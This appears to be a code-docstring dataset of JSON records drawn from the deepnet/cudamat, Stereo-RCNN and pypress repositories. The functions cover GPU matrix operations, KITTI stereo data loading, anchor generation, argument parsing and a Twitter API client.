{"docstring": "\"\"\"\nApply cos to each element of the matrix mat.\n\"\"\"\n\n", "func_signal": "def cos(mat, target = None):\n", "code": "if not target:\n    target = mat\n\nerr_code = _cudamat.apply_cos(mat.p_mat, target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nApply the logistic sigmoid to each element of the matrix mat.\n\"\"\"\n\n", "func_signal": "def sigmoid(mat, target = None):\n", "code": "if not target:\n    target = mat\n\nerr_code = _cudamat.apply_sigmoid(mat.p_mat, target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nFind the dot product between m1 and m2.\n\"\"\"\n\n", "func_signal": "def dot(m1, m2, mult=1.0, target = None):\n", "code": "if not target:\n    m = _cudamat.get_leading_dimension(m1.p_mat)\n    n = _cudamat.get_nonleading_dimension(m2.p_mat)\n\n    target = empty((m, n))\n\nerr_code = _cudamat.dot(m1.p_mat, m2.p_mat, target.p_mat, ct.c_float(0.), ct.c_float(mult))\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nCopies the matrix to an ndarray on the CPU and returns it.\n\"\"\"\n\n", "func_signal": "def asarray(self):\n", "code": "self.copy_to_host()\n\nreturn self.numpy_array", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nswap columns at indices1 of self with columns at indices2 of target.\n<indices1> and <indices2> must be row vectors of equal length. Its elements are float32's representing integers, e.g. \"34.0\" means the integer \"34\".\nafter this call, for all r,c, target[r,indices2[c]=self[r,indices1[c]].\nself can be same as target, but then the result will be non-deterministic if there is overlap between indices1 and indices2. Can be used for in-place shuffling by making sure indices1 and indices2 do not overlap.\nThis returns target.\nNegative indices are interpreted in the usual Python way: all elements of <indices> had better be in the range [-self.shape[1], self.shape[1]-1].\nThis does bounds checking, but out of bounds indices do not raise an exception (because the programmer was lazy). Instead, they result in NaN values in <target>.\n\"\"\"\n", "func_signal": "def swap_columns(self, indices1, indices2, target):\n", "code": "assert indices1.shape == indices2.shape\nerr_code = _cudamat.swapColumns(self.p_mat, target.p_mat, indices1.p_mat, indices2.p_mat)\n\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nDivide the matrix by a scalar.\n\"\"\"\n\n", "func_signal": "def div_by_scalar(self, alpha, target = None):\n", "code": "if not target:\n    target = self\n\nerr_code = _cudamat.divide_by_scalar(self.p_mat, ct.c_float(alpha), target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nimages - (n_images, img_w**2 * n_chans)\nhidSums - (n_images, n_locs**2 * n_filters)\ntargets - (n_filters, filter_w**2 * n_chans)\n\"\"\"\n", "func_signal": "def localOutp(images, hidSums, targets, numModulesX, paddingStart, filterSizeX, moduleStride, numImgColors):\n", "code": "numGroups = 1\npartialSum = 0\nnumImages = images.shape[0]\nnumFilters = hidSums.shape[1] / (numModulesX**2)\n\nassert targets.shape == (numFilters, numModulesX**2 * numImgColors * filterSizeX**2), '%s %d %d-%d-%d' % (targets.shape.__str__(), numFilters, numImgColors, filterSizeX, filterSizeX)\n_ConvNet.localOutp(images.p_mat, hidSums.p_mat, targets.p_mat,\n          numModulesX, filterSizeX, -paddingStart, moduleStride, numImgColors, numGroups, partialSum)", "path": "cudamat\\cudamat_conv.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"Compute derivative w.r.t input given derivative w.r.t output.\"\"\"\n", "func_signal": "def ComputeDeriv(self):\n", "code": "self.deriv.apply_tanh_deriv(self.state)\nif self.hyperparams.dropout:\n  self.deriv.mult(self.mask)", "path": "deepnet\\tanh_layer.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"Get an imdb (image database) by name.\"\"\"\n", "func_signal": "def get_imdb(name):\n", "code": "if name not in __sets:\n  raise KeyError('Unknown dataset: {}'.format(name))\nreturn __sets[name]()", "path": "lib\\datasets\\factory.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "'''\n    Generate the visible range of the bounding box according to\n    the occlusion relations between all objects\n\n    Remove almost totally occluded ones\n'''\n", "func_signal": "def remove_occluded_keypoints(self, objects, left=True):\n", "code": "ix = 0 if left else 1\n\ndepth_line = np.zeros(1260, dtype=float)\nfor i in range(len(objects)):\n    for col in range(int(objects[i].boxes[ix].box[0]), int(objects[i].boxes[ix].box[2])+1):\n        pixel = depth_line[col]\n        if pixel == 0.0:\n            depth_line[col] = objects[i].pos[2]\n        elif objects[i].pos[2] < depth_line[col]:\n            depth_line[col] = (objects[i].pos[2]+pixel)/2.0\n\nfor i in range(len(objects)):\n    objects[i].boxes[ix].visible_left = objects[i].boxes[ix].box[0]\n    objects[i].boxes[ix].visible_right = objects[i].boxes[ix].box[2]\n    left_visible = True\n    right_visible = True\n    if depth_line[int(objects[i].boxes[ix].box[0])] < objects[i].pos[2]:\n        left_visible = False\n    if depth_line[int(objects[i].boxes[ix].box[2])] < objects[i].pos[2]:\n        right_visible = False\n\n    if right_visible == False and left_visible == False:\n        objects[i].boxes[ix].visible_right = objects[i].boxes[ix].box[0]\n        objects[i].boxes[ix].keypoints[:] = -1\n\n    for col in range(int(objects[i].boxes[ix].box[0]), int(objects[i].boxes[ix].box[2])+1):\n        if left_visible and depth_line[col] >= objects[i].pos[2]:\n            objects[i].boxes[ix].visible_right = col\n        elif right_visible and depth_line[col] < objects[i].pos[2]:\n            objects[i].boxes[ix].visible_left = col\n\nobjects = [x for x in objects if np.sum(x.boxes[ix].keypoints)>-4]\n\nfor i in range(len(objects)):\n    left_kpt = 5000\n    right_kpt = 0\n    for j in range(4):\n        if objects[i].boxes[ix].keypoints[j] != -1:\n            if objects[i].boxes[ix].keypoints[j] < left_kpt:\n                left_kpt = objects[i].boxes[ix].keypoints[j]\n            if objects[i].boxes[ix].keypoints[j] > right_kpt:\n                right_kpt = objects[i].boxes[ix].keypoints[j]\n    for j in range(4):\n        if objects[i].boxes[ix].keypoints[j] != -1:\n            if objects[i].boxes[ix].keypoints[j] < objects[i].boxes[ix].visible_left-5 or \\\n               objects[i].boxes[ix].keypoints[j] > objects[i].boxes[ix].visible_right+5 or \\\n               objects[i].boxes[ix].keypoints[j] < left_kpt+3 or \\\n               objects[i].boxes[ix].keypoints[j] > right_kpt-3:\n                 objects[i].boxes[ix].keypoints[j] = -1\nreturn objects", "path": "lib\\datasets\\kitti.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"Enrich the imdb's roidb by adding some derived quantities that\nare useful for training. This function precomputes the maximum\noverlap, taken over ground-truth boxes, between each ROI and\neach ground-truth box. The class with maximum overlap is also\nrecorded.\n\"\"\"\n\n", "func_signal": "def prepare_roidb(imdb):\n", "code": "roidb = imdb.roidb\nif not (imdb.name.startswith('coco')):\n  sizes = [PIL.Image.open(imdb.img_left_path_at(i)).size\n       for i in range(imdb.num_images)]\n       \nfor i in range(len(imdb.image_index)):\n  roidb[i]['img_left'] = imdb.img_left_path_at(i)\n  roidb[i]['img_right'] = imdb.img_right_path_at(i)\n  if not (imdb.name.startswith('coco')):\n    roidb[i]['width'] = sizes[i][0]\n    roidb[i]['height'] = sizes[i][1]\n  # need gt_overlaps as a dense array for argmax\n  gt_overlaps = roidb[i]['gt_overlaps'].toarray()\n  # max overlap with gt over classes (columns)\n  max_overlaps = gt_overlaps.max(axis=1)\n  # gt class that had the max overlap\n  max_classes = gt_overlaps.argmax(axis=1)\n  roidb[i]['max_classes'] = max_classes\n  roidb[i]['max_overlaps'] = max_overlaps\n  # sanity checks\n  # max overlap of 0 => class should be zero (background)\n  zero_inds = np.where(max_overlaps == 0)[0]\n  assert all(max_classes[zero_inds] == 0)\n  # max overlap > 0 => class should not be zero (must be a fg class)\n  nonzero_inds = np.where(max_overlaps > 0)[0]\n  assert all(max_classes[nonzero_inds] != 0)", "path": "lib\\roi_data_layer\\roidb.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "'''\nParse input arguments\n'''\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Train the Stereo R-CNN network')\n\nparser.add_argument('--start_epoch', dest='start_epoch',\n                    help='starting epoch',\n                    default=1, type=int)\nparser.add_argument('--epochs', dest='max_epochs',\n                    help='number of epochs to train',\n                    default=20, type=int)\n\nparser.add_argument('--save_dir', dest='save_dir',\n                    help='directory to save models', default=\"models_stereo\",\n                    type=str)\nparser.add_argument('--nw', dest='num_workers',\n                    help='number of worker to load data',\n                    default=8, type=int)\nparser.add_argument('--bs', dest='batch_size',\n                    help='batch_size',\n                    default=1, type=int)\n\n# config optimization\nparser.add_argument('--lr_decay_step', dest='lr_decay_step',\n                    help='step to do learning rate decay, unit is epoch',\n                    default=5, type=int)\nparser.add_argument('--lr_decay_gamma', dest='lr_decay_gamma',\n                    help='learning rate decay ratio',\n                    default=0.1, type=float)\n\n# resume trained model\nparser.add_argument('--r', dest='resume',\n                    help='resume checkpoint or not',\n                    default=False, type=bool)\nparser.add_argument('--checkepoch', dest='checkepoch',\n                    help='checkepoch to load model',\n                    default=1, type=int)\nparser.add_argument('--checkpoint', dest='checkpoint',\n                    help='checkpoint to load model',\n                    default=6477, type=int)\n\nargs = parser.parse_args()\nreturn args", "path": "trainval_net.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nCombine multiple roidbs\n\"\"\"\n\n", "func_signal": "def combined_roidb(imdb_names, training=True):\n", "code": "def get_training_roidb(imdb):\n  \"\"\"Returns a roidb (Region of Interest database) for use in training.\"\"\"\n  if cfg.TRAIN.USE_FLIPPED:\n    print('Appending horizontally-flipped training examples...')\n    imdb.append_flipped_images()\n    print('done')\n\n  print('Preparing training data...')\n\n  prepare_roidb(imdb)\n  #ratio_index = rank_roidb_ratio(imdb)\n  print('done')\n\n  return imdb.roidb\n\ndef get_roidb(imdb_name):\n  imdb = get_imdb(imdb_name)\n  print('Loaded dataset `{:s}` for training'.format(imdb.name))\n  imdb.set_proposal_method('gt')\n  roidb = get_training_roidb(imdb)\n  return roidb\n\nroidbs = [get_roidb(s) for s in imdb_names.split('+')]\nroidb = roidbs[0]\n\nif len(roidbs) > 1:\n  for r in roidbs[1:]:\n    roidb.extend(r)\n  tmp = get_imdb(imdb_names.split('+')[1])\n  imdb = datasets.imdb.imdb(imdb_names, tmp.classes)\nelse:\n  imdb = get_imdb(imdb_names)\n\nif training:\n  roidb = filter_roidb(roidb)\n\nratio_list, ratio_index = rank_roidb_ratio(roidb)\n\nreturn imdb, roidb, ratio_list, ratio_index", "path": "lib\\roi_data_layer\\roidb.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "'''\nConstruct an image path from the image's \"index\" identifier.\n'''\n", "func_signal": "def img_left_path_from_index(self, index):\n", "code": "if self._image_set == 'test':\n    prefix = 'testing/image_2'\nelse:\n    prefix = 'training/image_2'\n\nimage_path = os.path.join(self._data_path, prefix,\\\n                          index + self._image_ext)\nassert os.path.exists(image_path), \\\n    'Path does not exist: {}'.format(image_path)\nreturn image_path", "path": "lib\\datasets\\kitti.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "'''\nConstruct an image path from the image's \"index\" identifier.\n'''\n", "func_signal": "def img_right_path_from_index(self, index):\n", "code": "if self._image_set == 'test':\n    prefix = 'testing/image_3'\nelse:\n    prefix = 'training/image_3'\n\nimage_path = os.path.join(self._data_path, prefix,\\\n                          index + self._image_ext)\nassert os.path.exists(image_path), \\\n    'Path does not exist: {}'.format(image_path)\nreturn image_path", "path": "lib\\datasets\\kitti.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each scale wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _scale_enum(anchor, scales):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nws = w * scales\nhs = h * scales\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "lib\\model\\rpn\\generate_anchors.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nscales: 1D array of anchor sizes in pixels. Example: [32, 64, 128]\nratios: 1D array of anchor ratios of width/height. Example: [0.5, 1, 2]\nshape: [height, width] spatial shape of the feature map over which\n        to generate anchors.\nfeature_stride: Stride of the feature map relative to the image in pixels.\nanchor_stride: Stride of anchors on the feature map. For example, if the\n    value is 2 then generate anchors for every other feature map pixel.\n\"\"\"\n# Get all combinations of scales and ratios\n", "func_signal": "def generate_anchors_single_pyramid(scales, ratios, shape, feature_stride, anchor_stride):\n", "code": "scales, ratios = np.meshgrid(np.array(scales), np.array(ratios))\nscales = scales.flatten()\nratios = ratios.flatten()\n\n# Enumerate heights and widths from scales and ratios\nheights = scales / np.sqrt(ratios)\nwidths = scales * np.sqrt(ratios)\n\n# Enumerate shifts in feature space\nshifts_y = np.arange(0, shape[0], anchor_stride) * feature_stride\nshifts_x = np.arange(0, shape[1], anchor_stride) * feature_stride\nshifts_x, shifts_y = np.meshgrid(shifts_x, shifts_y)\n\n# Enumerate combinations of shifts, widths, and heights\nbox_widths, box_centers_x = np.meshgrid(widths, shifts_x)\nbox_heights, box_centers_y = np.meshgrid(heights, shifts_y)\n\n# # Reshape to get a list of (y, x) and a list of (h, w)\n# box_centers = np.stack(\n#     [box_centers_y, box_centers_x], axis=2).reshape([-1, 2])\n# box_sizes = np.stack([box_heights, box_widths], axis=2).reshape([-1, 2])\n\n# NOTE: the original order is  (y, x), we changed it to (x, y) for our code\n# Reshape to get a list of (x, y) and a list of (w, h)\nbox_centers = np.stack(\n    [box_centers_x, box_centers_y], axis=2).reshape([-1, 2])\nbox_sizes = np.stack([box_widths, box_heights], axis=2).reshape([-1, 2])\n\n# Convert to corner coordinates (x1, y1, x2, y2)\nboxes = np.concatenate([box_centers - 0.5 * box_sizes,\n                        box_centers + 0.5 * box_sizes], axis=1)\nreturn boxes", "path": "lib\\model\\rpn\\generate_anchors.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"Bounding-box regression targets (bbox_target_data) are stored in a\ncompact form b x N x (class, tx, ty, tw, th)\nThis function expands those targets into the 4-of-4*K representation used\nby the network (i.e. only one class has non-zero targets).\nReturns:\n    bbox_target (ndarray): b x N x 4K blob of regression targets\n    bbox_inside_weights (ndarray): b x N x 4K blob of loss weights\n\"\"\"\n", "func_signal": "def _get_bbox_regression_labels_pytorch(self, bbox_target_data, labels_batch, num_classes):\n", "code": "batch_size = labels_batch.size(0)\nrois_per_image = labels_batch.size(1)\nclss = labels_batch\nbbox_targets = bbox_target_data.new(batch_size, rois_per_image, 4).zero_()\nbbox_inside_weights = bbox_target_data.new(bbox_targets.size()).zero_()\n\nfor b in range(batch_size):\n    # assert clss[b].sum() > 0\n    if clss[b].sum() == 0:\n        continue\n    inds = torch.nonzero(clss[b] > 0).view(-1)\n    for i in range(inds.numel()):\n        ind = inds[i]\n        bbox_targets[b, ind, :] = bbox_target_data[b, ind, :]\n        bbox_inside_weights[b, ind, :] = self.BBOX_INSIDE_WEIGHTS\n\nreturn bbox_targets, bbox_inside_weights", "path": "lib\\model\\rpn\\proposal_target_layer.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "'''\nLoad the indexes listed in this dataset's image set file.\n'''\n", "func_signal": "def _load_image_set_index_new(self):\n", "code": "if self.name == 'kitti_train':\n    train_set_file = open('data/kitti/splits/train.txt', 'r')\n    image_index = train_set_file.read().split('\\n')\nelif self.name == 'kitti_val':\n    val_set_file = open('data/kitti/splits/val.txt', 'r')\n    image_index = val_set_file.read().split('\\n')\n\nreturn image_index", "path": "lib\\datasets\\kitti.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "'''\nReturn the database of ground-truth regions of interest.\n\nThis function loads/saves from/to a cache file to speed up future calls.\n'''\n", "func_signal": "def gt_roidb(self):\n", "code": "cache_file = os.path.join(self._kitti_path, self.name + '_gt_roidb.pkl')\nprint('cache file', cache_file)\nif os.path.exists(cache_file):\n    with open(cache_file, 'rb') as fid:\n        roidb = cPickle.load(fid)\n    print('{} gt roidb loaded from {}'.format(self.name, cache_file))\n    return roidb\n\ngt_roidb = [self._load_kitti_annotation(index)\n            for index in self.image_index]\n\nwith open(cache_file, 'wb') as fid:\n    cPickle.dump(gt_roidb, fid, cPickle.HIGHEST_PROTOCOL)\nprint('wrote gt roidb to {}'.format(cache_file))\n\nreturn gt_roidb", "path": "lib\\datasets\\kitti.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nReturn width, height, x center, and y center for an anchor (window).\n\"\"\"\n\n", "func_signal": "def _whctrs(anchor):\n", "code": "w = anchor[2] - anchor[0] + 1\nh = anchor[3] - anchor[1] + 1\nx_ctr = anchor[0] + 0.5 * (w - 1)\ny_ctr = anchor[1] + 0.5 * (h - 1)\nreturn w, h, x_ctr, y_ctr", "path": "lib\\model\\rpn\\generate_anchors.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Test the Stereo R-CNN network')\n\nparser.add_argument('--load_dir', dest='load_dir',\n                    help='directory to load models', default=\"models_stereo\",\n                    type=str)\nparser.add_argument('--checkepoch', dest='checkepoch',\n                    help='checkepoch to load network',\n                    default=20, type=int)\nparser.add_argument('--checkpoint', dest='checkpoint',\n                    help='checkpoint to load network',\n                    default=6477, type=int)\n\nargs = parser.parse_args()\nreturn args", "path": "test_net.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "# A roidb is a list of dictionaries, each with the following keys:\n#   boxes\n#   gt_overlaps\n#   gt_classes\n#   flipped\n", "func_signal": "def roidb(self):\n", "code": "if self._roidb is not None:\n  return self._roidb\nself._roidb = self.roidb_handler()\nreturn self._roidb", "path": "lib\\datasets\\imdb.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "# filter the image without bounding box.\n", "func_signal": "def filter_roidb(roidb):\n", "code": "print('before filtering, there are %d images...' % (len(roidb)))\ni = 0\nwhile i < len(roidb):\n  if len(roidb[i]['boxes_left']) == 0 or len(roidb[i]['boxes_right']) == 0 or len(roidb[i]['boxes_merge']) == 0:\n    del roidb[i]\n    i -= 1\n  i += 1\n\nprint('after filtering, there are %d images...' % (len(roidb)))\nreturn roidb", "path": "lib\\roi_data_layer\\roidb.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "# rank roidb based on the ratio between width and height.\n", "func_signal": "def rank_roidb_ratio(roidb):\n", "code": "ratio_large = 2 # largest ratio to preserve.\nratio_small = 0.5 # smallest ratio to preserve.    \n\nratio_list = []\nfor i in range(len(roidb)):\n  width = roidb[i]['width']\n  height = roidb[i]['height']\n  ratio = width / float(height)\n\n  if ratio > ratio_large:\n    roidb[i]['need_crop'] = 1\n    ratio = ratio_large\n  elif ratio < ratio_small:\n    roidb[i]['need_crop'] = 1\n    ratio = ratio_small        \n  else:\n    roidb[i]['need_crop'] = 0\n\n  ratio_list.append(ratio)\n\nratio_list = np.array(ratio_list)\nratio_index = np.argsort(ratio_list)\nreturn ratio_list[ratio_index], ratio_index", "path": "lib\\roi_data_layer\\roidb.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nGiven a vector of widths (ws) and heights (hs) around a center\n(x_ctr, y_ctr), output a set of anchors (windows).\n\"\"\"\n\n", "func_signal": "def _mkanchors(ws, hs, x_ctr, y_ctr):\n", "code": "ws = ws[:, np.newaxis]\nhs = hs[:, np.newaxis]\nanchors = np.hstack((x_ctr - 0.5 * (ws - 1),\n                     y_ctr - 0.5 * (hs - 1),\n                     x_ctr + 0.5 * (ws - 1),\n                     y_ctr + 0.5 * (hs - 1)))\nreturn anchors", "path": "lib\\model\\rpn\\generate_anchors.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each aspect ratio wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _ratio_enum(anchor, ratios):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nsize = w * h\nsize_ratios = size / ratios\nws = np.round(np.sqrt(size_ratios))\nhs = np.round(ws * ratios)\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "lib\\model\\rpn\\generate_anchors.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Test the Stereo R-CNN network')\n\nparser.add_argument('--load_dir', dest='load_dir',\n                    help='directory to load models', default=\"models_stereo\",\n                    type=str)\nparser.add_argument('--checkepoch', dest='checkepoch',\n                    help='checkepoch to load network',\n                    default=20, type=int)\nparser.add_argument('--checkpoint', dest='checkpoint',\n                    help='checkpoint to load network',\n                    default=6477, type=int)\n\nargs = parser.parse_args()\nreturn args", "path": "demo.py", "repo_name": "HKUST-Aerial-Robotics/Stereo-RCNN", "stars": 667, "license": "mit", "language": "python", "size": 8868}
{"docstring": "# configure extensions          \n", "func_signal": "def configure_extensions(app):\n", "code": "db.init_app(app)\nmail.init_app(app)\ncache.init_app(app)\nsetup_themes(app)", "path": "pypress\\__init__.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Destroys the status specified by the required ID parameter.\n\nThe twitter.Api instance must be authenticated and the\nauthenticating user must be the author of the specified status.\n\nArgs:\n  id:\n    The numerical ID of the status you're trying to destroy.\n\nReturns:\n  A twitter.Status instance representing the destroyed status message\n'''\n", "func_signal": "def DestroyStatus(self, id):\n", "code": "try:\n    if id:\n        long(id)\nexcept:\n    raise TwitterError(\"id must be an integer\")\nurl = '%s/statuses/destroy/%s.json' % (self.base_url, id)\njson = self._FetchUrl(url, post_data={'id': id})\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn Status.NewFromJsonDict(data)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Post one or more twitter status messages from the authenticated user.\n\nUnlike api.PostUpdate, this method will post multiple status updates\nif the message is longer than 140 characters.\n\nThe twitter.Api instance must be authenticated.\n\nArgs:\n  status:\n    The message text to be posted.\n    May be longer than 140 characters.\n  continuation:\n    The character string, if any, to be appended to all but the\n    last message.  Note that Twitter strips trailing '...' strings\n    from messages.  Consider using the unicode \\u2026 character\n    (horizontal ellipsis) instead. [Defaults to None]\n  **kwargs:\n    See api.PostUpdate for a list of accepted parameters.\n\nReturns:\n  A of list twitter.Status instance representing the messages posted.\n'''\n", "func_signal": "def PostUpdates(self, status, continuation=None, **kwargs):\n", "code": "results = list()\nif continuation is None:\n    continuation = ''\nline_length = CHARACTER_LIMIT - len(continuation)\nlines = textwrap.wrap(status, line_length)\nfor line in lines[0:-1]:\n    results.append(self.PostUpdate(line + continuation, **kwargs))\nresults.append(self.PostUpdate(lines[-1], **kwargs))\nreturn results", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Fetch the rate limit status for the currently authorized user.\n\nReturns:\n  A dictionary containing the time the limit will reset (reset_time),\n  the number of remaining hits allowed before the reset (remaining_hits),\n  the number of hits allowed in a 60-minute period (hourly_limit), and\n  the time of the reset in seconds since The Epoch (reset_time_in_seconds).\n'''\n", "func_signal": "def GetRateLimitStatus(self):\n", "code": "url  = '%s/account/rate_limit_status.json' % self.base_url\njson = self._FetchUrl(url, no_cache=True)\ndata = simplejson.loads(json)\n\nself._CheckForTwitterError(data)\n\nreturn data", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Create a new instance based on a JSON dict.\n\nArgs:\n  data:\n    A JSON dict, as converted from the JSON in the twitter API\n\nReturns:\n  A twitter.List instance\n'''\n", "func_signal": "def NewFromJsonDict(data):\n", "code": "if 'user' in data:\n    user = User.NewFromJsonDict(data['user'])\nelse:\n    user = None\nreturn List(id=data.get('id', None),\n            name=data.get('name', None),\n            slug=data.get('slug', None),\n            description=data.get('description', None),\n            full_name=data.get('full_name', None),\n            mode=data.get('mode', None),\n            uri=data.get('uri', None),\n            member_count=data.get('member_count', None),\n            subscriber_count=data.get('subscriber_count', None),\n            following=data.get('following', None),\n            user=user)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Get a human redable string representing the posting time\n\nReturns:\n  A human readable string representing the posting time\n'''\n", "func_signal": "def GetRelativeCreatedAt(self):\n", "code": "fudge = 1.25\ndelta  = long(self.now) - long(self.created_at_in_seconds)\n\nif delta < (1 * fudge):\n    return 'about a second ago'\nelif delta < (60 * (1/fudge)):\n    return 'about %d seconds ago' % (delta)\nelif delta < (60 * fudge):\n    return 'about a minute ago'\nelif delta < (60 * 60 * (1/fudge)):\n    return 'about %d minutes ago' % (delta / 60)\nelif delta < (60 * 60 * fudge) or delta / (60 * 60) == 1:\n    return 'about an hour ago'\nelif delta < (60 * 60 * 24 * (1/fudge)):\n    return 'about %d hours ago' % (delta / (60 * 60))\nelif delta < (60 * 60 * 24 * fudge) or delta / (60 * 60 * 24) == 1:\n    return 'about a day ago'\nelse:\n    return 'about %d days ago' % (delta / (60 * 60 * 24))", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Return a string in key=value&key=value form\n\nValues of None are not included in the output string.\n\nArgs:\n  parameters:\n    A dict of (key, value) tuples, where value is encoded as\n    specified by self._encoding\n\nReturns:\n  A URL-encoded string in \"key=value&key=value\" form\n'''\n", "func_signal": "def _EncodeParameters(self, parameters):\n", "code": "if parameters is None:\n    return None\nelse:\n    return urllib.urlencode(dict([(k, self._Encode(v)) for k, v in parameters.items() if v is not None]))", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "# Break url into consituent parts\n", "func_signal": "def _BuildUrl(self, url, path_elements=None, extra_params=None):\n", "code": "(scheme, netloc, path, params, query, fragment) = urlparse.urlparse(url)\n\n# Add any additional path elements to the path\nif path_elements:\n    # Filter out the path elements that have a value of None\n    p = [i for i in path_elements if i]\n    if not path.endswith('/'):\n        path += '/'\n    path += '/'.join(p)\n\n# Add any additional query parameters to the query string\nif extra_params and len(extra_params) > 0:\n    extra_query = self._EncodeParameters(extra_params)\n    # Add it to the existing query\n    if query:\n        query += '&' + extra_query\n    else:\n        query = extra_query\n\n# Return the rebuilt URL\nreturn urlparse.urlunparse((scheme, netloc, path, params, query, fragment))", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
